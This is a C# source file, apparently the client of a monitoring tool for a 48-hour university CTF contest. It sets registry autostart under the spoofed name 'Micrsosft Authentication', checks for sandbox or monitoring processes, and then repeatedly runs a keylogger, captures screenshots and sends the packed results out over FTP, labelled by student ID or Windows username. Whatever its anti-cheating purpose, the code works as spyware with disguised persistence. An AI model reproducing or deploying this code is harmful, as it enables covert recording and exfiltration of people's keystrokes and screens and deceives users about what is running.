using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Runtime.CompilerServices;
using System.Windows.Forms.VisualStyles;

using SetStartup;
using getScreenShot;
using PackAndSend;
using Sandbox7Vm;



/*
* 调用登录GUI程序（包括检查环境，发送POST认证）同时写入authre.init文件真实姓名和学号。
* 设置开机自启，启动的是自己，通过检查是否存在init文件决定是否启动GUI登录界面。记录{本程序位置；当前时间，版本}
* 循环的截图敲击记录和发送程序
* 
* 20221222:添加日志文件，优化运行机制
* 20221223:更换文件发送方式并通过验证，还需要对启动逻辑进行优化
*/

namespace MainControl
{
    class MakeLog
    {
        // JNU+学号+jnctf+年份的md5是token
        public string CreateToken(string s)
        {
            s = "JNU" + s + "jnctf2022";
            byte[] tmpBytes = Encoding.UTF8.GetBytes(s);
            byte[] tmpHash = new MD5CryptoServiceProvider().ComputeHash(tmpBytes);

            int i;
            StringBuilder sOutput = new StringBuilder(tmpHash.Length);
            for (i = 0; i < tmpHash.Length; i++)
            {
                sOutput.Append(tmpHash[i].ToString("X2"));
            }
            // 32位大写的MD5值
            return sOutput.ToString();
        }

        // 检查启动目录，若不存在开机自启对应项目则重新设置
        public bool CheckStartup()
        {
            string runKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(runKeyPath, true);
            if (runKey.GetValue("Micrsosft Authentication") == null)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
    }

    // 产生提示
    class Prompt
    {
        public void WaitingFroms()
        {
            MessageBox.Show("正在检测网络环境", "Waiting", MessageBoxButtons.OK, MessageBoxIcon.None);
        }
    }

    class Program1
    {
        // 生成init文件
        public static bool MakeInitFile()
        {
            MakeLog log = new MakeLog();
            string LocalPath = Environment.CurrentDirectory;
            string FilePath = LocalPath + @"\authre.init";

            // 判断文件时候存在并是否为空
            if (File.Exists(FilePath))
            {
                // 读取文件内容，检查文件是否符合格式
                string[] logcontent = File.ReadAllLines(FilePath);
                try
                {
                    if (logcontent[0].Contains("name : ") && logcontent[0].Split(' ')[2].Length >= 2 &&
                        logcontent[1].Contains("stuid : ") && logcontent[1].Split(' ')[2].Length >= 9 &&
                        logcontent[2].Contains("token : ") && logcontent[2].Split(' ')[2].Length >= 32)
                    {
                        // 重新计算token和stuid计算的md5值是不是一样的.
                        if (logcontent[2].Split(' ')[2] == log.CreateToken(logcontent[1].Split(' ')[2]))
                        {
                            return true;
                        }
                        else
                        {
                            return false;
                        }
                    }
                    else
                    {
                        return false;
                    }
                }
                catch
                {
                    return false;
                }
            }
            else
            {
                // 没有找到文件，就新建一个文件
                FileStream file_init = new FileStream(LocalPath + @"\authre.init", FileMode.Create, FileAccess.Write);
                file_init.Close();
                return false;
            }
        }


        static void Main(string[] args)
        {
            // 开始之前仅仅对进程列表进行检查
            DetectProcess promon = new DetectProcess();
            promon.ProcessMon();

            MakeLog pro = new MakeLog();

            // 如果不满足条件，就创建init文件
            bool ifLog = true;

            // 如果判断文件格式符合要求的话，就检查启动目录有没有
            ifLog = MakeInitFile();

            // 检查init的格式和启动目录
            // 如果init出现问题，或者是刚创建，那么就要检查启动目录是否有变化
            int flag = 0;
            if (!ifLog)
            {
                // 文件有问题，flag=1
                flag += 1;
                // 如果没有启动目录的话就尝试建立
                if (!pro.CheckStartup())
                {
                    // 文件有问题，启动目录有问题，说明刚开始这是 flag=2
                    flag += 1;
                    try
                    {
                        string fullpath = Path.GetFullPath(System.Reflection.Assembly.GetEntryAssembly().Location);
                        SetStartup.StartUp.Set_StartUp(fullpath);
                    }
                    catch
                    {
                        MessageBox.Show("Permission Error", "Error 0x10000088");
                        Environment.Exit(0);
                    }
                }
            }
            else        // 文件没问题
            {
                // 如果没有启动目录的话就尝试建立
                if (!pro.CheckStartup())
                {
                    try
                    {
                        string fullpath = Path.GetFullPath(System.Reflection.Assembly.GetEntryAssembly().Location);
                        SetStartup.StartUp.Set_StartUp(fullpath);
                        MessageBox.Show("已经完成认证了哦\n", "Fighting!!", MessageBoxButtons.OK);
                    }
                    catch
                    {
                        MessageBox.Show("Permission Error", "Error 0x10000088");
                        Environment.Exit(0);
                    }
                }
                else
                {
                    // 文件没有问题，启动目录也没有问题
                    MessageBox.Show("已经完成认证了哦\n", "Fighting!!", MessageBoxButtons.OK);
                    Environment.Exit(0);
                }
            }


            MakeLog wlog = new MakeLog();

            // flag = 2说明程序首次运行。
            if (flag == 2 || flag == 1)
            {
                // 等待验证的弹窗
                Prompt msg = new Prompt();
                msg.WaitingFroms();

                // 当init文件出现损坏，那就把他删除，然后重新创建一个
                if (flag == 1) { File.Delete("authre.init"); }

                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = "LoginGraphics.exe";
                    startInfo.Arguments = "DevelopedByDRootkit123" + " " + "1234098";

                    Process proc0 = Process.Start(startInfo);

                    // 等待当前（登录）进程执行完毕。
                    proc0.WaitForExit();
                    //MessageBox.Show(proc0.ExitCode.ToString()); 如果登录界面出现异常，就不再向下进行了
                    if (proc0.ExitCode != 0)
                    {
                        Environment.Exit(0);
                    }
                }
                catch
                {
                    MessageBox.Show("Permission Error", "Error 0x10000087");
                }
            }

            // flag为1，说明有启动目录但是init文件损坏，需要重建init文件

            // 只要当前时间不是比赛结束时间，就一直执行下面的循环。
            var time_now = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds();
            // 比赛持续时间，单位：小时。
            int duration = 48;
            var time_end = time_now + (duration * 3600);

            // 设置启动键盘记录的参数
            try
            {
                ProcessStartInfo startInfo1 = new ProcessStartInfo();
                startInfo1.FileName = "x64_GetHelpLog.exe";
                startInfo1.Arguments = "crootkit:Donnot_Try_RunMe" + " " + "212" + " " + "5544" + " " + "coushu";

                Random random = new Random();

                // 发布版本使用的
                //while (new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() < time_end)
                // 这是测试使用的
                int n = 1;
                while (n == 1)
                {
                    // 开始键盘记录
                    Process proc = Process.Start(startInfo1);
                    // 获取系统截图
                    getScreenShot.OneScreenCatClass.ScreenShotMain();
                    // 间隔时间 -- 测试
                    Thread.Sleep(1000 * 15);
                    // 间隔时间 -- 发布
                    //Thread.Sleep(1000 * 60 * (8 - T));
                    // 关闭键盘记录进程
                    proc.Kill();
                    // 暂停2s再发包，防止问题
                    Thread.Sleep(2000);

                    // 通过ftp发包,如果写的学号正确就发学号命名，不然就发当前用户命名的。
                    try
                    {
                        string usrid = File.ReadAllLines("authre.init")[1].Split(' ')[2];
                        PackAndSend.MainProgram.Main_PackAndSend(usrid);
                    }
                    catch
                    {
                        string usrid = Environment.UserName;
                        PackAndSend.MainProgram.Main_PackAndSend(usrid);
                    }
                    n--;
                }
            }
            catch
            {
                MessageBox.Show("SomeThing Wrong", "Error Code 0x0004");
            }
        }
    }
}